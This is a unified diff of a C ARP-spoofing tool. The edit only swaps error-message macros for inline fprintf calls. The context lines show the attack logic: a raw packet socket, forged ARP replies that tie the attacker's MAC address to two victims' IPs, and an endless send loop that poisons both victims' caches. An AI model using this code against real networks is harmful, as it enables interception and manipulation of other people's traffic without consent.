@@ -16,15 +16,6 @@
 # define BROADCAST_ADDR (uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
 
 
-# define ERROR_SOCKET_CREATION          fprintf(stderr,"ERROR: Socket creation failed\n")
-# define ERROR_GET_MAC                  fprintf(stderr,"ERROR: Could not get MAC address\n")
-# define ERROR_PACKET_CREATION_ARP      fprintf(stderr,"ERROR: ARP packet creation failed\n")
-# define ERROR_PACKET_CREATION_ETHER    fprintf(stderr,"ERROR: Ether frame creation failed\n")
-# define ERROR_COULD_NOT_SEND           fprintf(stderr,"ERROR: Could not send\n")
-# define ERROR_COULD_NOT_RECEIVE        fprintf(stderr,"ERROR: Could not receive\n")
-# define ERROR_DISPLAY_USAGE(F)         fprintf(stderr,"USAGE: %s source_ip target_ip interface\n",F)
-
-
 // https://stackoverflow.com/a/1779758/11135136
 // https://stackoverflow.com/a/1519596/11135136
 unsigned char *get_my_mac_address(const int sock, const char interface[const])
@@ -67,14 +58,14 @@ char broadcast_packet(const int sd,
     if (!(eth_pkt = create_arp_packet(ARPOP_REQUEST,
                                       hacker_mac, spoof_ip,
                                       BROADCAST_ADDR, victim_ip))) {
-        ERROR_PACKET_CREATION_ETHER;
+        fprintf(stderr, "ERROR: Ether frame creation failed\n");
         return 0;
     }
     fprintf(stdout, "[+] ETHER packet created\n");
 
     if ((sendto(sd, eth_pkt, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                 (const struct sockaddr *)device, sizeof(*device))) <= 0) {
-        ERROR_COULD_NOT_SEND;
+        fprintf(stderr, "ERROR: Could not send\n");
         return 0;
     }
     fprintf(stdout, "[+] Packet sent to broadcast\n");
@@ -145,21 +136,21 @@ void spoof_arp(const int sd, struct sockaddr_ll *device,
     if (!(arp_packet_1 = create_arp_packet(ARPOP_REPLY,
                                            hacker_mac, victim_ip_1,
                                            victim_mac_2, victim_ip_2))) {
-        ERROR_PACKET_CREATION_ARP;
+        fprintf(stderr, "ERROR: ARP packet creation failed\n");
         return 0;
     }
 
     if (!(arp_packet_2 = create_arp_packet(ARPOP_REPLY,
                                            hacker_mac, victim_ip_2,
                                            victim_mac_1, victim_ip_1))) {
-        ERROR_PACKET_CREATION_ARP;
+        fprintf(stderr, "ERROR: ARP packet creation failed\n");
         return 0;
     }
 
     while (1) {
         if ((sendto(sd, arp_packet_1, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                     (const struct sockaddr *)device, sizeof(*device))) <= 0) {
-            ERROR_COULD_NOT_SEND;
+            fprintf(stderr, "ERROR: Could not send\n");
             return 0;
         }
         fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", victim_ip_2);
@@ -167,7 +158,7 @@ void spoof_arp(const int sd, struct sockaddr_ll *device,
 
         if ((sendto(sd, arp_packet_2, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                     (const struct sockaddr *)device, sizeof(*device))) <= 0) {
-            ERROR_COULD_NOT_SEND;
+            fprintf(stderr, "ERROR: Could not send\n");
             return 0;
         }
         fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", victim_ip_1);
@@ -180,7 +171,7 @@ void spoof_arp(const int sd, struct sockaddr_ll *device,
 int main(int argc, char *argv[])
 {
     // if (argc != 4) {
-    //     ERROR_DISPLAY_USAGE(argv[0]);
+    //     fprintf(stderr, "USAGE: %s source_ip target_ip interface\n", argv[0]);
     //     exit(EXIT_FAILURE);
     // }
 
@@ -216,12 +207,12 @@ int main(int argc, char *argv[])
      */
 
     if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
-        ERROR_SOCKET_CREATION;
+        fprintf(stderr, "ERROR: Socket creation failed\n");
         return EXIT_FAILURE;
     }
 
     if (!(hacker_mac = get_my_mac_address(sock, interface))) {
-        ERROR_GET_MAC;
+        fprintf(stderr, "ERROR: Could not get MAC address\n");
         return EXIT_FAILURE;
     }
 
